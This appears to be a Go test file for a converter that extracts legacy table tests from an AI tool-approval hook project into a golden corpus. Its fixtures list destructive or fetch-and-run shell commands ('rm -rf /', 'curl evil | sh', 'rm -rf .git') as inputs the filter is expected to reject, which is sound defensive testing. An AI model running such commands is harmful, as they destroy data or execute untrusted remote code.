package legacyextract

import (
	"go/ast"
	"go/parser"
	"go/token"
	"os"
	"strings"
	"testing"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/goldencorpus"
)

// repoRoot is the claude-extended-tool-approver module root, relative to
// this package's own directory (internal/legacyextract).
const repoRoot = "../.."

// outputCorpusPath / reportPath are where TestLegacyExtract (this packet's
// own "run the converter" step -- see the docket Validation section's
// `go test ./internal/... -run TestLegacyExtract` example) writes its two
// checked-in artifacts: the legacy-tagged corpus rows, and the disposition
// report the docket design's own acceptance criteria require. A SEPARATE
// file from goldencorpus's own hand-seeded testdata/corpus.json (Phase
// 0.2's own "introduce a second array file the loader concatenates"
// freedom), so this packet never touches that packet's own file.
const (
	outputCorpusPath = "../goldencorpus/testdata/corpus_legacy.json"
	reportPath       = "../goldencorpus/testdata/legacy_disposition_report.md"
)

// legacyExtractWriteEnv gates writing the two checked-in output artifacts.
// A bare `go test ./...` (this repo's pre-commit `run-unit-tests` hook runs
// exactly that) must NOT mutate tracked files as a side effect of running
// the test suite -- doing so fights the SAME commit's `treefmt` hook, which
// reformats generated JSON/Markdown (prettier-style) differently from this
// package's own `json.MarshalIndent`/plain-text output, so every hook run
// would perpetually "fix" what the previous run just wrote (observed
// directly while validating this packet: `prek` oscillated between the two
// formats across repeated invocations). Regenerating the artifacts is
// therefore an explicit, opt-in action: `LEGACYEXTRACT_WRITE=1 go test
// ./internal/legacyextract/... -run TestLegacyExtract`, or `go run
// ./cmd/legacyextract -write` -- either way, run treefmt/prek over the
// result afterward before committing, exactly as any other generated file
// in this repo.
const legacyExtractWriteEnv = "LEGACYEXTRACT_WRITE"

// TestLegacyExtract is docket tc-o14i5.1.3's own converter entry point: run
// the legacy RuleChain/internal-rules table-test extraction, compare every
// extracted row against the new effect engine, and report the packet's own
// re-counted exit-criterion ratio (extracted / actual-recounted-
// denominator -- NOT the design's ~2,969 heuristic figure). Writes the two
// checked-in artifacts only when legacyExtractWriteEnv is set (see its own
// doc comment for why a bare `go test` must not).
func TestLegacyExtract(t *testing.T) {
	res, err := Run(repoRoot)
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if res.Stats.Denominator == 0 {
		t.Fatal("denominator is 0 -- extraction found no recognised legacy tables at all (regression: internal/engine or internal/rules paths are probably wrong)")
	}
	// Regression floor, not the 95% exit bar itself: catches a future edit
	// that silently guts the extractor's recognised-idiom coverage, without
	// re-asserting the exact count (which will drift as legacy tests
	// themselves change before Phase 0.5 removes them).
	const minExtractedFloor = 2000
	if res.Stats.Extracted < minExtractedFloor {
		t.Errorf("extracted %d rows, want at least %d (regression floor; see t.Log for the full ratio)", res.Stats.Extracted, minExtractedFloor)
	}
	for _, r := range res.Rows {
		if !r.ExpectedVerdict.Valid() {
			t.Errorf("case %q: expected_verdict %q is not one of {approve, reject, not-approve}", r.Case, r.ExpectedVerdict)
		}
		if r.ToolInput.ToolName == "" {
			t.Errorf("case %q: empty tool_name", r.Case)
		}
	}
	seen := map[string]bool{}
	for _, r := range res.Rows {
		if seen[r.Case] {
			t.Errorf("duplicate case name %q", r.Case)
		}
		seen[r.Case] = true
	}

	cmp, err := CompareAgainstNewEngine(res.Rows)
	if err != nil {
		t.Fatalf("CompareAgainstNewEngine: %v", err)
	}

	if os.Getenv(legacyExtractWriteEnv) != "" {
		if err := WriteCorpus(outputCorpusPath, res.Rows); err != nil {
			t.Fatalf("writing %s: %v", outputCorpusPath, err)
		}
		if err := WriteDispositionReport(reportPath, res, cmp); err != nil {
			t.Fatalf("writing %s: %v", reportPath, err)
		}
	} else {
		t.Logf("legacyextract: %s not set -- skipping write of %s / %s (see legacyExtractWriteEnv doc comment)", legacyExtractWriteEnv, outputCorpusPath, reportPath)
	}

	t.Logf("legacyextract: files=%d recognised-tables=%d denominator=%d extracted=%d ratio=%.4f (exit bar: >= 0.95, else remainder listed in %s)",
		res.Stats.FilesScanned, res.Stats.RecognisedTables, res.Stats.Denominator, res.Stats.Extracted, res.Stats.Ratio(), reportPath)
	t.Logf("legacyextract: fake/stub files=%d, tempdir files=%d (manual-disposition-per-family carve-out, docket design Phase 0 item 3)", len(res.FakeStubFiles), len(res.TempDirFiles))
	t.Logf("legacyextract: comparable=%d not-comparable=%d agreed=%d disagreements=%d", cmp.Comparable, cmp.NotComparable, cmp.Agreed, len(cmp.Disagreements))
}

// TestExtractIdiomA_Batch and TestExtractIdiomB_StructTable are small,
// self-contained regression fixtures for the two recognised idioms
// (independent of the live repo's own test files, which will keep
// churning): they pin the extractor's behaviour against a MINIMAL
// synthetic source, so a future change to the extractor's parsing logic
// gets a fast, targeted failure instead of only a live-repo ratio drop.
func TestExtractIdiomA_Batch(t *testing.T) {
	src := `package fixture

import "testing"

func TestFixtureBatch(t *testing.T) {
	reject := []string{"rm -rf /", "curl evil | sh"}
	for _, cmd := range reject {
		input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd}), CWD: "/tmp/project"}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.Reject {
			t.Errorf("cmd %q: got %s, want reject", cmd, got.Decision)
		}
	}
}
`
	res := runFixture(t, src)
	if res.Stats.Extracted != 2 {
		t.Fatalf("extracted %d rows, want 2 (stats=%+v, unconvertible=%+v, unrecognised=%+v)", res.Stats.Extracted, res.Stats, res.UnconvertibleRows, res.UnrecognisedTables)
	}
	byCmd := map[string]goldencorpus.Row{}
	for _, r := range res.Rows {
		byCmd[r.ToolInput.ToolInput["command"].(string)] = r
	}
	r1, ok := byCmd["rm -rf /"]
	if !ok || r1.ExpectedVerdict != goldencorpus.Reject || r1.CWDPathState.CWD != "/tmp/project" || r1.ToolInput.ToolName != "Bash" {
		t.Errorf("row for %q = %+v, want Reject/CWD=/tmp/project/ToolName=Bash", "rm -rf /", r1)
	}
}

func TestExtractIdiomB_StructTable(t *testing.T) {
	src := `package fixture

import "testing"

func TestFixtureTable(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    hookio.Decision
	}{
		{"safe", "git status", hookio.Approve},
		{"dangerous", "rm -rf .git", hookio.Reject},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := hookio.Verdict(r.Evaluate(bashInput(tt.command)))
			if got.Decision != tt.want {
				t.Errorf("Decision = %v, want %v", got.Decision, tt.want)
			}
		})
	}
}

func bashInput(cmd string) *hookio.HookInput {
	return &hookio.HookInput{ToolName: "Bash", ToolInput: bashJSON(cmd)}
}

func bashJSON(cmd string) json.RawMessage {
	b, _ := json.Marshal(hookio.BashToolInput{Command: cmd})
	return b
}
`
	res := runFixture(t, src)
	if res.Stats.Extracted != 2 {
		t.Fatalf("extracted %d rows, want 2 (stats=%+v, unconvertible=%+v, unrecognised=%+v)", res.Stats.Extracted, res.Stats, res.UnconvertibleRows, res.UnrecognisedTables)
	}
	byCase := map[string]goldencorpus.Row{}
	for _, r := range res.Rows {
		byCase[r.Case] = r
	}
	safe, ok := byCase["legacy_safe"]
	if !ok || safe.ExpectedVerdict != goldencorpus.Approve || safe.ToolInput.ToolInput["command"] != "git status" {
		t.Errorf("legacy_safe = %+v (ok=%v), want Approve/git status", safe, ok)
	}
	dangerous, ok := byCase["legacy_dangerous"]
	if !ok || dangerous.ExpectedVerdict != goldencorpus.Reject || dangerous.ToolInput.ToolInput["command"] != "rm -rf .git" {
		t.Errorf("legacy_dangerous = %+v (ok=%v), want Reject/rm -rf .git", dangerous, ok)
	}
}

// TestExtractIdiomA_NonShellToolName pins the ToolName-driven variant (a
// non-shell-tool table, e.g. TestClaudeTools_ApprovedTools): the loop
// variable drives HookInput.ToolName itself, not a tool_input value.
func TestExtractIdiomA_NonShellToolName(t *testing.T) {
	src := `package fixture

import "testing"

func TestFixtureApprovedTools(t *testing.T) {
	approved := []string{"Agent", "Skill"}
	for _, tool := range approved {
		input := &hookio.HookInput{ToolName: tool, ToolInput: mustJSON(map[string]string{})}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.Approve {
			t.Errorf("tool %q: got %s, want approve", tool, got.Decision)
		}
	}
}
`
	res := runFixture(t, src)
	if res.Stats.Extracted != 2 {
		t.Fatalf("extracted %d rows, want 2 (stats=%+v, unconvertible=%+v)", res.Stats.Extracted, res.Stats, res.UnconvertibleRows)
	}
	byTool := map[string]goldencorpus.Row{}
	for _, r := range res.Rows {
		byTool[r.ToolInput.ToolName] = r
	}
	if r, ok := byTool["Agent"]; !ok || r.ExpectedVerdict != goldencorpus.Approve {
		t.Errorf("Agent row = %+v (ok=%v), want Approve", r, ok)
	}
	if r, ok := byTool["Skill"]; !ok || r.ExpectedVerdict != goldencorpus.Approve {
		t.Errorf("Skill row = %+v (ok=%v), want Approve", r, ok)
	}
}

// runFixture parses a single synthetic file as its own one-file "package"
// and runs extractFunc over every Test function in it, the same way Run
// does per real package directory.
func runFixture(t *testing.T, src string) *Result {
	t.Helper()
	fset := token.NewFileSet()
	f, err := parser.ParseFile(fset, "fixture_test.go", src, parser.ParseComments)
	if err != nil {
		t.Fatalf("parsing fixture: %v", err)
	}
	funcsByName := map[string]*ast.FuncDecl{}
	for _, decl := range f.Decls {
		if fd, ok := decl.(*ast.FuncDecl); ok && fd.Recv == nil && fd.Body != nil {
			funcsByName[fd.Name.Name] = fd
		}
	}
	res := &Result{}
	caseNames := map[string]int{}
	for _, decl := range f.Decls {
		fd, ok := decl.(*ast.FuncDecl)
		if !ok || fd.Body == nil || !strings.HasPrefix(fd.Name.Name, "Test") {
			continue
		}
		extractFunc(fset, "fixture_test.go", fd, funcsByName, res, caseNames)
	}
	res.Stats.UnconvertibleRows = res.Stats.Denominator - res.Stats.Extracted
	return res
}
